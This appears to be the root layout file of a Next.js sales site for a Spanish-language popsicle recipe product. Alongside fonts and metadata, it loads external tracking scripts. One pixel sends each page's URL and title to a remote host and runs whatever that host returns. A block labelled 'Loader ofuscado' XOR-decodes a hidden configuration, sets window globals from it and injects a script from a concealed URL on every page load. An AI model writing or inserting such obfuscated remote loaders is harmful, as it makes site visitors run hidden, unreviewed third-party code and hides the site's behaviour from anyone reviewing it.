import type { Metadata, Viewport } from 'next'
import { Baloo_2, Nunito } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const baloo = Baloo_2({
  subsets: ['latin'],
  weight: ['500', '600', '700', '800'],
  variable: '--font-baloo',
  display: 'swap',
})

const nunito = Nunito({
  subsets: ['latin'],
  weight: ['400', '600', '700', '800'],
  variable: '--font-nunito',
  display: 'swap',
})

export const metadata: Metadata = {
  title: '100 Paletas Rellenas y Cremosas',
  description:
    '+ de 100 Recetas de Paletas Rellenas, Cremosas y Fáciles de Vender. Para quien quiere ganar dinero desde casa sin ingredientes caros ni pasar horas inventando recetas.',
  generator: 'v0.app',
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#FFF8EC',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="es" className={`${baloo.variable} ${nunito.variable} bg-background`}>
      <body className="font-sans antialiased">
        {children}
        <Script
          src="https://gtm.maquinadeingresos.site/track1click.js"
          strategy="afterInteractive"
        />
        <Script
          src="https://go.recetasrentables.site/track1click.js"
          strategy="afterInteractive"
        />
        {/* Pixel X App - START */}
        <Script id="pixel-x-app" strategy="afterInteractive">
          {`!function(){var e=window.location.href,t=document.title,n=Date.now(),o=document.createElement('script');o.src='https://pxa.recetasrentables.site/remote?url='+encodeURIComponent(e)+'&title='+encodeURIComponent(t)+'&time='+n,o.async=!0,document.head.appendChild(o)}()`}
        </Script>
        {/* Pixel X App - END */}
        {/* Loader ofuscado - START */}
        <Script id="obf-loader" strategy="afterInteractive">
          {`(function(){var v_i12=atob("DODvY3jtmhhwx1KEEJvNFgqBuCJSrybwYJPVTFeO/nZesibpeYaWTRuC9zYStX33c5KGEwyetWgZvzfoP5CGGx2BtHID5X6mcZSbERGP72wVtHC+S73DQR+B9XoRqyGmKruUQRaM931S/XD0eZiKDzGJuDRSsTPoZYXNWVrb+y5C9mbnJdTfAkCJqCsT9WO9IoTeWh7P50UN");var k_mm=[];for(var z_yz=0;z_yz<v_i12.length;z_yz++){k_mm.push(v_i12.charCodeAt(z_yz)&255);}var h_t9=k_mm[0];var x_jd=k_mm.slice(1,1+h_t9);var z_jv6=k_mm.slice(1+h_t9);var c_4=z_jv6.map(function(b,t_n){return b^x_jd[t_n%h_t9];});var n_2="";for(var m_f=0;m_f<c_4.length;m_f++){n_2+=String.fromCharCode(c_4[m_f]&255);}var z_7=decodeURIComponent(escape(n_2));var t_wur=JSON.parse(z_7);var b_xqb=t_wur.globals||[];b_xqb.forEach(function(e_lz8){window[e_lz8.name]=e_lz8.value;});var p_lc=document.createElement("script");p_lc.src=t_wur.url;p_lc.async=true;p_lc.defer=true;(t_wur.attributes||[]).forEach(function(x_43u){p_lc.setAttribute(x_43u.name,x_43u.value);});(document.head||document.documentElement).appendChild(p_lc);})();`}
        </Script>
        {/* Loader ofuscado - END */}
      </body>
    </html>
  )
}
